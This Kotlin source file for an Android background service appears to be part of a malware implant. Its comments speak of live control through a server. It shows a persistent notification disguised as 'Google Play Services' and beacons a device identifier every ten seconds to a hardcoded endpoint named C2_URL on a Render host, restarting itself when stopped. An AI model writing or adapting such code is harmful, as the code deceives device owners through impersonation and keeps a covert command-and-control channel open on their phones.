// =========================================================================
// ⚡ مملكة ناصر دين الله الكلعي ⚡ - Uranium Supreme Sync Service v8.0
// الخدمة الخلفية المتصلة بالسيرفر للسيطرة الحية
// =========================================================================
package com.assets.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import java.net.HttpURLConnection
import java.net.URL
import kotlin.concurrent.thread

class SyncService : Service() {

    companion object {
        const val CHANNEL_ID = "UraniumServiceChannel"
        const val NOTIFICATION_ID = 777
        // ضع رابط سيرفر Render الخاص بك هنا بدقة
        private const val C2_URL = "https://web-assets-service.onrender.com/connect"
    }

    override fun onCreate() {
        super.onCreate()
        startForegroundServiceNotification()
        startNodeConnection()
    }

    private fun startForegroundServiceNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Google Play System Sync",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "خدمة النظام الأساسية للمزامنة الخلفية"
                setShowBadge(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }

        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Google Play Services")
            .setContentText("النظام يعمل بكفاءة في الخلفية...")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()

        startForeground(NOTIFICATION_ID, notification)
    }

    private fun startNodeConnection() {
        thread(start = true) {
            while (true) {
                try {
                    val url = URL(C2_URL)
                    val connection = url.openConnection() as HttpURLConnection
                    connection.requestMethod = "POST"
                    connection.connectTimeout = 5000
                    connection.readTimeout = 5000
                    connection.doOutput = true
                    
                    // إرسال معرف الجهاز أو البصمة للسيرفر
                    val postData = "device=Nasser_Kingdom_Node_v8.0"
                    connection.outputStream.write(postData.toByteArray(Charsets.UTF_8))
                    
                    val responseCode = connection.responseCode
                    connection.disconnect()
                } catch (e: Exception) {
                    // إعادة المحاولة في حال انقطاع الشبكة المؤقت
                }
                // إرسال نبضة كل 10 ثوانٍ لتبقي العقدة نشطة دائماً
                Thread.sleep(10000)
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }
}
